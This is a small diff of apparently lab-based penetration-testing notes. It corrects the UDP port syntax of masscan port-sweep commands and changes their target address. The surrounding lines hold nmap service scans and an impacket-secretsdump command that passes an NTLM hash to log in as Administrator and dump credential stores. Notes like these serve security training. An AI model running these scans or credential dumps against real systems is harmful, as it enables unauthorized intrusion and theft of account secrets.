@@ -34,7 +34,7 @@
 
 `sudo nmap -sV -sC -sU 192.168.44.30 -p 1-1000 -Pn | tee scan.txt`
 
-`sudo masscan -p1-65535,U1:65535 192.168.44.30 --rate=1000 -e tun0`
+`sudo masscan -p1-65535,U:1-65535 192.168.228.222 --rate=1000 -e tun0`
 
 `Test-NetConnection -Port 445 192.168.45.33`
 
@@ -1881,7 +1881,7 @@ On 192.168.178.248:
 	
 impacket-secretsdump Administrator@192.168.178.248 -hashes ":56e4633688c0fdd57c610faf9d7ab8df"
 
-sudo masscan -p1-65535,U1:65535 192.168.178.247 --rate=1000 -e tun0
+sudo masscan -p1-65535,U:1-65535 192.168.228.222 --rate=1000 -e tun0
 
 sudo nmap -sV -sC -p 14020,14080 192.168.178.247
 
